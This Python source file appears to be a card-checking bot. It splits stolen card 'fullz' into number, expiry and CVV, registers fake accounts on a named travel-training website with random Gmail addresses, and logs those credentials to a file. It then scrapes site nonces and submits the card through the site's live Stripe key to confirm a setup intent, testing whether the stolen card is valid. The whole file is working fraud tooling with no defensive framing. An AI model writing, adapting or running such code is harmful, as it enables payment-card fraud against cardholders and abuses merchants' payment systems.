import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote, urlparse, parse_qs
import requests

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

async def create_braintree_auth(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        yy = ano[-2:]  # Get last 2 digits of year
        mm = mes.zfill(2)  # Ensure 2-digit month

        session = requests.Session()
        email = generate_random_email()
        
        # Initial headers and request
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            # ... rest of headers ...
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']

        # Registration data
        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('_wp_http_referer', '/register/'),
            # ... rest of data fields ...
        ]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(f'{email}:Esahatam2009@')
        else:
            return None

        # Payment method setup
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
            # ... rest of headers ...
        }

        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
        html = response.text
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

        # Stripe API call
        headers = {
            'authority': 'api.stripe.com',
            'origin': 'https://js.stripe.com',
            # ... rest of headers ...
        }

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        
        if response.status_code == 200:
            iddd = response.json()['id']
        else:
            return None

        # Final confirmation
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'origin': 'https://www.thetravelinstitute.com',
            # ... rest of headers ...
        }

        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': iddd,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
        return response.json()

    except Exception as e:
        return str(e)
